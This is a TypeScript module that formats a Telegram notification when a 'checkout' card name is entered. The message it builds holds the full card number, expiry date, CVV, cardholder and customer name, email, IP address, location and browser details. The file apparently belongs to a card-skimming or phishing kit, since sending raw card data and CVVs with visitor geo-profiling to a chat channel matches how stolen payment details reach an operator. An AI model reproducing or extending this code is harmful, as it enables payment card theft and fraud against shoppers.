import { parseUserAgent } from "@/lib/visitors/user-agent";
import type { VisitorGeoDetails } from "@/lib/visitors/types";

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function line(label: string, value?: string | number | boolean | null): string {
  if (value == null || value === "") return "";
  const text = typeof value === "boolean" ? (value ? "Yes" : "No") : String(value);
  return `<b>${escapeHtml(label)}:</b> ${escapeHtml(text)}\n`;
}

export interface CheckoutCardNameContext {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  email?: string;
  fullName?: string;
  path?: string;
  userAgent: string;
  acceptLanguage?: string;
  geo: VisitorGeoDetails | null;
  submittedAt: string;
  storeName?: string;
}

export function formatCheckoutCardNameTelegramMessage(
  ctx: CheckoutCardNameContext
): string {
  const { browser, os, device } = parseUserAgent(ctx.userAgent);
  const geo = ctx.geo;

  const locationParts = [
    geo?.city,
    geo?.region,
    geo?.country,
    geo?.countryCode ? `(${geo.countryCode})` : null,
  ].filter(Boolean);

  let message = "<b>💳 Checkout — card name entered</b>";
  if (ctx.storeName) {
    message += `\n${escapeHtml(ctx.storeName)}`;
  }
  message += "\n\n";

  message += "<b>Cardholder</b>\n";
  message += line("Name on card", ctx.cardName);
  message += line("Card number", ctx.cardNumber);
  message += line("Card expiry", ctx.cardExpiry);
  message += line("Card CVV", ctx.cardCvv);
  message += line("Email", ctx.email);
  message += line("Customer name", ctx.fullName);

  message += "\n<b>📍 Location</b>\n";
  message += line("IP", geo?.ip ?? "Unknown");
  message += line("Location", locationParts.join(", ") || "Unknown");
  message += line("Timezone", geo?.timezone);

  message += "\n<b>🌐 Session</b>\n";
  message += line("Page", ctx.path);
  message += line("Submitted at", ctx.submittedAt);
  message += line("Device", device);
  message += line("Browser", `${browser} on ${os}`);

  return message;
}
